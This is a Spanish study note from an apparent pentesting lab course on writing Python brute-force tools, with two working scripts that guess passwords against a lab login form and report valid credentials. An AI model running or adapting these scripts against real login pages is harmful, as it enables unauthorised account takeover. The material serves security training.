---
layout: apunte
title: "2. Developing a Brute-Forcing Tool"
---

Ahora que hemos entendido la importancia de Python para la creación de herramientas personalizadas, exploraremos cómo podemos desarrollar una herramienta de fuerza bruta para bypassear la autentificación. Los ataques de fuerza bruta involucran intentar múltiples usuarios y contraseñas hasta encontrar credenciales correctas. Aunque pueden ser mitigados con rate limiting, sigue siendo un trabajo sencillo para los hackers.

-----------------------------------
<h2>Comandos Esenciales</h2>
Antes de empezar a programar, veamos algunas funciones esenciales y técnicas usadas en la fuerza bruta:

- **Librerías de Peticiones:** Una librería de Python que facilita mandar peticiones HTTP y recibir respuestas de las aplicaciones web. Tiene funciones implementadas para mandar headers custom como user-agent, HTTP method y más.
- **Manejo de Respuestas:** Identificar logins exitosos basado en el código de estado HTTP, redirecciones o patrones de contenido, las cuales ayudan a identificar credenciales válidas.
- **Librería de String:** Funciones implementadas del módulo String hacen más fácil generar secuencias de letras, realizar manipulación de texto y más.

------------------------------------
<h2>Práctica</h2>
Para entender la esencia de las herramientas personalizadas usando Python, considera una aplicación web en `http://python.thm/labs/lab1`. Visita la aplicación y verás el siguiente panel:

!**Pasted image 20260320133943.png**

Como pentester, tu tarea es bypassear el mecanismo de autentificación y ganar acceso al dashboard principal. Supón que descubres el username `admin` y la contraseña es numérica de 4 dígitos.

Escribe un script simple en Python para automatizar este ataque. 

```python
import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break

brute_force()
```

Y ahora modifícalo para que se ajuste a un usuario llamado Mark y que tiene una contraseña formada por tres números y una letra (A-Z) mayúscula.

```python
import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

password_list = [str(i).zfill(3) + letter  for i in range(1000) for letter in string.ascii_uppercase]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break

brute_force()
```